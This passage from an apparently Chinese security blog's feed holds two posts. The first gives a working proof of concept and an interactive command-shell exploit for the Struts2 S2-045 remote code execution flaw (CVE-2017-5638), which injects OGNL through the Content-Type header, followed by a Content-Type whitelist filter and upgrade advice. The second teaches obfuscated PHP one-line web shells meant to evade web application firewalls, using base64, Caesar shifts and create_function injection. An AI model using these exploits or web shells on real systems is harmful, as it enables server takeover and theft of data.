Safari/537.36"</span></div><div class="line">    header[<span class="string">"Content-Type"</span>]=<span class="string">'''%&#123;(#nike='multipart/form-data').</span></div><div class="line">    (#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).</div><div class="line">    (#_memberAccess?(#_memberAccess=#dm):</div><div class="line">    ((#container=#context['com.opensymphony.xwork2.ActionContext.container']).</div><div class="line">    (#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).</div><div class="line">    (#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).</div><div class="line">    (#context.setMemberAccess(#dm)))).(#cmd='cat /etc/passwd').</div><div class="line">    (#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).</div><div class="line">    (#cmds=(#iswin?&#123;'cmd.exe','/c',#cmd&#125;:&#123;'/bin/bash','-c',#cmd&#125;)).</div><div class="line">    (#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).</div><div class="line">    (#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().</div><div class="line">    getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).</div><div class="line">    (#ros.flush())&#125;'''</div><div class="line">    request = urllib2.Request(str(sys.argv[<span class="number">1</span>]),datagen,headers=header)</div><div class="line">    response = urllib2.urlopen(request)</div><div class="line">    <span class="keyword">print</span> response.read()</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">poc()</div></pre></td></tr></table></figure>
<h2 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="comment"># coding:utf-8</span></div><div class="line"><span class="keyword">import</span> requests,json,re</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">Poc</span><span class="params">(url,command)</span>:</span></div><div class="line">    headers = &#123;<span class="string">'Content-Type'</span>: <span class="string">'multipart/form-data; boundary=f363ec3cc5ab44708db6a275b1f31a16'</span>,<span class="string">"User-Agent"</span>:<span class="string">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"</span>&#125;</div><div class="line">    headers[<span class="string">"Content-Type"</span>] = <span class="string">"%&#123;(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=' \</span></div><div class="line">                          "+command+<span class="string">"').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?&#123;'cmd.exe','/c',#cmd&#125;:&#123;'/bin/bash','-c',#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;"</span></div><div class="line"></div><div class="line">    data = json.dumps(&#123;<span class="string">"image1"</span>:url&#125;)</div><div class="line">    <span class="keyword">try</span>:</div><div class="line">        req = requests.post(url,data=data,headers=headers)</div><div class="line">        <span class="keyword">if</span> req.status_code == <span class="number">200</span>:</div><div class="line">            <span class="keyword">print</span> req.content</div><div class="line">    <span class="keyword">except</span> requests.ConnectionError,e:</div><div class="line">        <span class="keyword">print</span> e</div><div class="line"></div><div class="line">th = &#123;<span class="string">"url"</span>:<span class="string">""</span>&#125;</div><div class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">    <span class="keyword">if</span> th.get(<span class="string">"url"</span>) != <span class="string">""</span>:</div><div class="line">        input_cmd = raw_input(<span class="string">"cmd &gt;&gt;: "</span>)</div><div class="line">        <span class="keyword">if</span> input_cmd == <span class="string">"exit"</span>:</div><div class="line">            exit()</div><div class="line">        <span class="keyword">elif</span> input_cmd == <span class="string">'set'</span>:</div><div class="line">            url = raw_input(<span class="string">"set url :"</span>)</div><div class="line">            th[<span class="string">'url'</span>] = url</div><div class="line">        <span class="keyword">elif</span> input_cmd == <span class="string">'show url'</span>:</div><div class="line">            <span class="keyword">print</span> th.get(<span class="string">"url"</span>)</div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            Poc(th.get(<span class="string">"url"</span>),input_cmd)</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        url = raw_input(<span class="string">"set url :"</span>)</div><div class="line">        th[<span class="string">"url"</span>] = url</div></pre></td></tr></table></figure>
<h2 id="加固方式"><a href="#加固方式" class="headerlink" title="加固方式"></a>加固方式</h2><h3 id="通过判断Content-Type头是否为白名单类型，来限制非法Content-Type的攻击。"><a href="#通过判断Content-Type头是否为白名单类型，来限制非法Content-Type的攻击。" class="headerlink" title="通过判断Content-Type头是否为白名单类型，来限制非法Content-Type的攻击。"></a>通过判断Content-Type头是否为白名单类型，来限制非法Content-Type的攻击。</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> java.io.IOException;</div><div class="line"><span class="keyword">import</span> javax.servlet.Filter;</div><div class="line"><span class="keyword">import</span> javax.servlet.FilterChain;</div><div class="line"><span class="keyword">import</span> javax.servlet.FilterConfig;</div><div class="line"><span class="keyword">import</span> javax.servlet.ServletException;</div><div class="line"><span class="keyword">import</span> javax.servlet.ServletRequest;</div><div class="line"><span class="keyword">import</span> javax.servlet.ServletResponse;</div><div class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</div><div class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</div><div class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SecurityFilter</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> <span class="keyword">implements</span> <span class="title">Filter</span> </span>&#123;</div><div class="line"></div><div class="line">	<span class="comment">/**</span></div><div class="line">	 * </div><div class="line">	 */</div><div class="line">	<span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">1L</span>;</div><div class="line">	</div><div class="line">	</div><div class="line">	<span class="keyword">public</span> <span class="keyword">final</span> String www_url_encode= <span class="string">"application/x-www-form-urlencoded"</span>;</div><div class="line">	<span class="keyword">public</span> <span class="keyword">final</span> String mul_data= <span class="string">"multipart/form-data "</span>;</div><div class="line">	<span class="keyword">public</span> <span class="keyword">final</span> String txt_pla= <span class="string">"text/plain"</span>;</div><div class="line"></div><div class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doFilter</span><span class="params">(ServletRequest arg0, ServletResponse arg1,</span></span></div><div class="line">			FilterChain arg2) <span class="keyword">throws</span> IOException, ServletException &#123;</div><div class="line"></div><div class="line">		HttpServletRequest request = (HttpServletRequest) arg0;</div><div class="line">		HttpServletResponse response = (HttpServletResponse) arg1;</div><div class="line">		</div><div class="line">		String contenType=request.getHeader(<span class="string">"conTent-type"</span>);</div><div class="line">		</div><div class="line">		<span class="keyword">if</span>(contenType!=<span class="keyword">null</span>&amp;&amp;!contenType.equals(<span class="string">""</span>)&amp;&amp;!contenType.equalsIgnoreCase(www_url_encode)&amp;&amp;!contenType.equalsIgnoreCase(mul_data)&amp;&amp;!contenType.equalsIgnoreCase(txt_pla))&#123;</div><div class="line">			</div><div class="line">			response.setContentType(<span class="string">"text/html;charset=UTF-8"</span>);</div><div class="line">			response.getWriter().write(<span class="string">"非法请求Content-Type！"</span>);</div><div class="line">			<span class="keyword">return</span>;</div><div class="line">		&#125;</div><div class="line">		arg2.doFilter(request, response);</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">(FilterConfig arg0)</span> <span class="keyword">throws</span> ServletException </span>&#123;</div><div class="line"></div><div class="line">	&#125;</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h3 id="将Java编译以后的“SecurityFilter-class”（SecurityFilter-java是源代码文件）复制到应用的WEB-INF-classes目录下"><a href="#将Java编译以后的“SecurityFilter-class”（SecurityFilter-java是源代码文件）复制到应用的WEB-INF-classes目录下" class="headerlink" title="将Java编译以后的“SecurityFilter.class”（SecurityFilter.java是源代码文件）复制到应用的WEB-INF/classes目录下"></a>将Java编译以后的“SecurityFilter.class”（SecurityFilter.java是源代码文件）复制到应用的WEB-INF/classes目录下</h3><h3 id="⦁-配置Filter-将下面的代码加入WEB-INF-web-xml文件中"><a href="#⦁-配置Filter-将下面的代码加入WEB-INF-web-xml文件中" class="headerlink" title="⦁    配置Filter 将下面的代码加入WEB-INF/web.xml文件中"></a>⦁    配置Filter 将下面的代码加入WEB-INF/web.xml文件中</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">&lt;filter&gt;</div><div class="line">    &lt;filter-name&gt;SecurityFilter&lt;/filter-name&gt;</div><div class="line">    &lt;filter-class&gt;SecurityFilter&lt;/filter-class&gt;</div><div class="line">  &lt;/filter&gt;</div><div class="line">&lt;filter-mapping&gt;</div><div class="line">    &lt;filter-name&gt;SecurityFilter&lt;/filter-name&gt;</div><div class="line">    &lt;url-pattern&gt;/*&lt;/url-pattern&gt;</div><div class="line">&lt;/filter-mapping&gt;</div></pre></td></tr></table></figure>
<h3 id="代表拦截所有请求，进行攻击代码检查，-action只检查-action结尾的请求。"><a href="#代表拦截所有请求，进行攻击代码检查，-action只检查-action结尾的请求。" class="headerlink" title="/代表拦截所有请求，进行攻击代码检查，.action只检查.action结尾的请求。"></a>/<em>代表拦截所有请求，进行攻击代码检查，</em>.action只检查.action结尾的请求。</h3><h3 id="如果你正在使用基于Jakarta的文件上传Multipart解析器，请升级到-Apache-Struts-2-3-32或2-5-10-1版；或者也可以切换到不同的实现文件上传Multipart解析器"><a href="#如果你正在使用基于Jakarta的文件上传Multipart解析器，请升级到-Apache-Struts-2-3-32或2-5-10-1版；或者也可以切换到不同的实现文件上传Multipart解析器" class="headerlink" title="如果你正在使用基于Jakarta的文件上传Multipart解析器，请升级到 Apache Struts 2.3.32或2.5.10.1版；或者也可以切换到不同的实现文件上传Multipart解析器"></a>如果你正在使用基于Jakarta的文件上传Multipart解析器，请升级到 <a href="https://repository.apache.org/content/groups/staging/org/apache/struts/struts2-core/2.3.32/" target="_blank" rel="external">Apache Struts 2.3.32</a>或2.5.10.1版；或者也可以切换到不同的实现文件上传Multipart解析器</h3><h3 id="重启应用即可"><a href="#重启应用即可" class="headerlink" title="重启应用即可"></a>重启应用即可</h3>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;br&gt;&lt;/p&gt;
&lt;h3 id=&quot;近日，安恒信息安全研究院WEBIN实验室高级安全研究员nike-zheng发现著名J2EE框架-Struts2存在远程代码执行的严重漏洞。&quot;&gt;&lt;a href=&quot;#近日，安恒信息安全研究院WEBIN实验室高级安全研究员nike-zheng发现著名J2EE框架-Struts2存在远程代码执行的严重漏洞。&quot; class=&quot;headerlink&quot; title=&quot;近日，安恒信息安全研究院WEBIN实验室高级安全研究员nike.zheng发现著名J2EE框架-Struts2存在远程代码执行的严重漏洞。&quot;&gt;&lt;/a&gt;近日，安恒信息安全研究院WEBIN实验室高级安全研究员nike.zheng发现著名J2EE框架-Struts2存在远程代码执行的严重漏洞。&lt;/h3&gt;&lt;h2 id=&quot;漏洞编号&quot;&gt;&lt;a href=&quot;#漏洞编号&quot; class=&quot;headerlink&quot; title=&quot;漏洞编号&quot;&gt;&lt;/a&gt;漏洞编号&lt;/h2&gt;&lt;h3 id=&quot;S2-045，CVE-2017-5638&quot;&gt;&lt;a href=&quot;#S2-045，CVE-2017-5638&quot; class=&quot;headerlink&quot; title=&quot;S2-045，CVE-2017-5638&quot;&gt;&lt;/a&gt;S2-045，CVE-2017-5638&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;/li&gt;&lt;/ul&gt;
    
    </summary>
    
    
      <category term="S2-045" scheme="http://iosmosis.github.io/tags/S2-045/"/>
    
      <category term="poc" scheme="http://iosmosis.github.io/tags/poc/"/>
    
      <category term="exp" scheme="http://iosmosis.github.io/tags/exp/"/>
    
  </entry>
  
  <entry>
    <title>一句话Shell编写思路</title>
    <link href="http://iosmosis.github.io/2017/03/05/oneshell/"/>
    <id>http://iosmosis.github.io/2017/03/05/oneshell/</id>
    <published>2017-03-05T04:47:01.000Z</published>
    <updated>2017-04-08T15:14:10.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="很多人都头痛-好不容易找到上传点拿shell了-却发现有狗-其实过狗并不是很难-所以我在这里总结一下思路"><a href="#很多人都头痛-好不容易找到上传点拿shell了-却发现有狗-其实过狗并不是很难-所以我在这里总结一下思路" class="headerlink" title="很多人都头痛 好不容易找到上传点拿shell了 却发现有狗 = = 其实过狗并不是很难 所以我在这里总结一下思路"></a>很多人都头痛 好不容易找到上传点拿shell了 却发现有狗 = = 其实过狗并不是很难 所以我在这里总结一下思路</h3><ul>
<li><a id="more"></a>
<the rest="" of="" contents="" |="" 余下全文="">

</the></li>
</ul>
<h2 id="经典方式"><a href="#经典方式" class="headerlink" title="经典方式"></a>经典方式</h2><h3 id="应该是很常见的方法-利用-可变变量进行赋值传值来打到过狗目的，例如："><a href="#应该是很常见的方法-利用-可变变量进行赋值传值来打到过狗目的，例如：" class="headerlink" title="应该是很常见的方法 利用 可变变量进行赋值传值来打到过狗目的，例如："></a>应该是很常见的方法 利用 <a href="http://www.php.net/manual/zh/language.variables.variable.php" target="_blank" rel="external">可变变量</a>进行赋值传值来打到过狗目的，例如：</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span> $jg16=base64_decode;</div><div class="line">$z=$jg16(YXNzZXJ0);</div><div class="line">$z($_POST[q]);</div><div class="line"><span class="meta">?&gt;</span></div><div class="line">这个一句话需要用到这个函数</div><div class="line"><span class="comment">//base64_encode();//base64编码</span></div><div class="line"><span class="comment">//base64_decode();//base64解码</span></div><div class="line">主要就是进行加密然后传值绕过对一句话的检测　这次暂不详细讲解</div></pre></td></tr></table></figure>
<p>##system()的巧妙利用</p>
<p>##调用system()由于在php中system函数属于系统函数所以对于一般的waf是可以通杀的 </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">system($_GET[‘a’]($_GET[‘b’]))</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
<h2 id="利用古典密码进行对shell加密"><a href="#利用古典密码进行对shell加密" class="headerlink" title="利用古典密码进行对shell加密"></a>利用古典密码进行对shell加密</h2><h3 id="在CTF中-经常会碰到密码学问题-比如古典密码（凯撒加密-rot13-等等）"><a href="#在CTF中-经常会碰到密码学问题-比如古典密码（凯撒加密-rot13-等等）" class="headerlink" title="在CTF中 经常会碰到密码学问题 比如古典密码（凯撒加密 rot13 等等）"></a>在CTF中 经常会碰到密码学问题 比如古典密码（凯撒加密 rot13 等等）</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">kaisa</span><span class="params">($arr)</span></span>&#123;</div><div class="line"><span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt; strlen($arr);$i++)&#123;</div><div class="line">$arr[$i]=chr(ord($arr[$i])<span class="number">-6</span>);</div><div class="line">&#125;</div><div class="line"><span class="keyword">return</span> $arr;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h3 id="这里的凯撒密码采用按ascii码进行向ascii增大的方向移动6位得到的密文，所以向ascii减小的方向移动6位来解码所以构造出一句话"><a href="#这里的凯撒密码采用按ascii码进行向ascii增大的方向移动6位得到的密文，所以向ascii减小的方向移动6位来解码所以构造出一句话" class="headerlink" title="这里的凯撒密码采用按ascii码进行向ascii增大的方向移动6位得到的密文，所以向ascii减小的方向移动6位来解码所以构造出一句话"></a>这里的凯撒密码采用按ascii码进行向ascii增大的方向移动6位得到的密文，所以向ascii减小的方向移动6位来解码所以构造出一句话</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$arr=<span class="string">"j&#123;fq-)dUTXY`&#125;b.@"</span>;</div><div class="line"><span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt; strlen($arr);$i++)&#123;</div><div class="line">$arr[$i]=chr(ord($arr[$i])<span class="number">-5</span>);</div><div class="line">&#125;</div><div class="line"><span class="keyword">eval</span>($arr);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
<h2 id="利用函数代码执行来代替eval"><a href="#利用函数代码执行来代替eval" class="headerlink" title="利用函数代码执行来代替eval"></a>利用函数代码执行来代替eval</h2><h3 id="利用-create-function代码执行漏洞-该函数漏洞这里不进行详细讲解-。-create-function要接收两个参数-args和-code来组成新的函数fucntion-lambda-func-args-code-并eval-function-lambda-func-args-code-，那么我们只要构造-code来闭合-然后将自己的代码放到函数体外面就可以执行"><a href="#利用-create-function代码执行漏洞-该函数漏洞这里不进行详细讲解-。-create-function要接收两个参数-args和-code来组成新的函数fucntion-lambda-func-args-code-并eval-function-lambda-func-args-code-，那么我们只要构造-code来闭合-然后将自己的代码放到函数体外面就可以执行" class="headerlink" title="利用 create_function代码执行漏洞 该函数漏洞这里不进行详细讲解 。 create_function要接收两个参数$args和$code来组成新的函数fucntion_lambda_func($args){$code;} 并eval(function_lambda_func($args){$code;})，那么我们只要构造$code来闭合}然后将自己的代码放到函数体外面就可以执行"></a>利用 <a href="http://www.cnseay.com/1901/" target="_blank" rel="external">create_function代码执行漏洞</a> 该函数漏洞这里不进行详细讲解 。 create_function要接收两个参数$args和$code来组成新的函数fucntion_lambda_func($args){$code;} 并eval(function_lambda_func($args){$code;})，那么我们只要构造$code来闭合}然后将自己的代码放到函数体外面就可以执行</h3><p>这里构造为$code = “n;}$_POST[x];/*”;<br>注意：双引号里面的变量会进行解析，即如果我们echo $code 并且post提交x=phpinfo();那么输出应该是：n;}phpinfo();;/</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">payload解析：</div><div class="line"> </div><div class="line">;来结束语句</div><div class="line"> </div><div class="line">&#125;来结束函数体</div><div class="line"> </div><div class="line">phpinfo();;就在函数体外面被<span class="keyword">eval</span>执行了</div><div class="line"> </div><div class="line"><span class="comment">/*注释多余的代码</span></div><div class="line"> </div><div class="line">最终代码：eval(function_lambda_func($args)&#123;n;&#125;phpinfo();;/*&#125;)</div><div class="line">最终构造出</div><div class="line"></div><div class="line">&lt;?php</div><div class="line">$args = "１";</div><div class="line">$code = "n;&#125;$_POST[x];/*";</div><div class="line">echo create_function('$args',$code);</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<h3 id="这些思路-只是用来启发大家-如果更好的思路-可以一起分享-我会整合到一起"><a href="#这些思路-只是用来启发大家-如果更好的思路-可以一起分享-我会整合到一起" class="headerlink" title="这些思路 只是用来启发大家 如果更好的思路 可以一起分享 我会整合到一起"></a>这些思路 只是用来启发大家 如果更好的思路 可以一起分享 我会整合到一起</h3>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;很多人都头痛-好不容易找到上传点拿shell了-却发现有狗-其实过狗并不是很难-所以我在这里总结一下思路&quot;&gt;&lt;a href=&quot;#很多人都头痛-好不容易找到上传点拿shell了-却发现有狗-其实过狗并不是很难-所以我在这里总结一下思路&quot; class=&quot;headerlink&quot; title=&quot;很多人都头痛 好不容易找到上传点拿shell了 却发现有狗 = = 其实过狗并不是很难 所以我在这里总结一下思路&quot;&gt;&lt;/a&gt;很多人都头痛 好不容易找到上传点拿shell了 却发现有狗 = = 其实过狗并不是很难 所以我在这里总结一下思路&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;/li&gt;&lt;/ul&gt;
    
    </summary>
    
    
      <category term="shell" scheme="http://iosmosis.github.io/tags/shell/"/>
    
      <category term="waf" scheme="http://iosmosis.github.io/tags/waf/"/>
    
  </entry>
  
</feed>
